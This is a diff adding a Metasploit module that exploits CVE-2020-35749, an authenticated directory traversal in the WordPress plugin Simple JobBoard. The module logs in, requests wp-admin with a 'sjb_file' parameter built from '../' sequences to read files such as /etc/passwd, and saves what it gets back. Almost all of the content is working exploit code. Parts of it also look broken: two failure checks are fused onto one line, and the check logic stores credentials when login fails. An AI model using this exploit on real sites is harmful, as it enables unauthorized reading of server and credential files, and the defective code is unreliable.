@@ -1,0 +1,89 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Auxiliary
+    include Msf::Auxiliary::Report
+    include Msf::Exploit::Remote::HTTP::Wordpress
+    include Msf::Auxiliary::Scanner
+
+      def initialize(info = {})
+          super(update_info(info,
+            'Name'           => 'Simple JobBoard Authenticated File Read Vulnerability',
+            'Description'    => %q{
+                This module exploits an authenticated directory traversal vulnerability in WordPress plugin 'Simple JobBoard ' < 2.9.3,
+                allowing arbitrary file read with the web server privileges.
+            },
+            'Author'         =>
+              [
+                'Arcangelo Saracino', # Vulnerability discovery
+                'Hoa Nguyen - Suncsr Team',    # Metasploit module
+              ],
+            'License'        => MSF_LICENSE,
+            'References'     =>
+              [
+                ['CVE', '2020-35749'],
+                ['WPVDB', 'eed3bd69-2faf-4bc9-915c-c36211ef9e2d'],
+                ['URL','https://arkango.github.io/CVE-2020/CVE-2020-35749%20DIr.%20Traversal%20Simple%20Board%20Job%20Wordpress%20plugin.html']
+              ],
+            'DisclosureDate' => 'Jan 15 2021'))
+
+            register_options([
+                OptString.new('FILEPATH',[true,'The path to the file to read','/etc/passwd']),
+                OptString.new('USERNAME',[true,'The WordPress username to authenticate with']),
+                OptString.new('PASSWORD',[true,'The Wordpress password to authenticate with']),
+                OptInt.new('DEPTH',[true,'Traversal Depth (to reach the root folder',8]),
+            ])
+            end
+
+            def username
+                datastore['USERNAME']
+            end
+
+            def password
+                datastore['PASSWORD']
+            end
+
+            def check
+                cookie = wordpress_login(username,password)
+                if cookie.nil?
+                    store_valid_credential(user: username, private: password, proof: cookie)
+                    return CheckCode::Safe
+                end
+                CheckCode::Appears
+            end
+
+            def run_host(ip)
+                cookie = wordpress_login(username, password)
+                traversal = '../' * datastore['DEPTH']
+                filename = datastore['FILEPATH']
+                filename = filename[1, filename.length] if filename =~ /^\//
+
+                res = send_request_cgi({
+                    'cookie' => cookie,
+                    'method' => 'GET',
+                    'uri' => normalize_uri(target_uri.path,'wp-admin',''),
+                    'vars_get' =>
+                    {
+                        'post' => 'application_id',
+                        'action' => 'edit',
+                        'sjb_file' => "#{traversal}#{filename}"
+                    }
+                })
+
+                fail_with Failure::Unreachable, 'Connection failed' unless res fail_with Failure::NotVulnerable, 'Connection failed. Nothingn was downloaded' if res.code != 200
+                fail_with Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter' if res.body.length.zero?
+                print_good('Downloading file ...')
+                print_line("\n#{res.body}\n")
+                fname = datastore['FILEPATH']
+                path = store_loot(
+                    'Simple_JobBoard.traversal',
+                    'text/plain',
+                    ip,
+                    res.body,
+                    fname
+                )
+                print_good("File save in: #{path}")
+            end
+        end
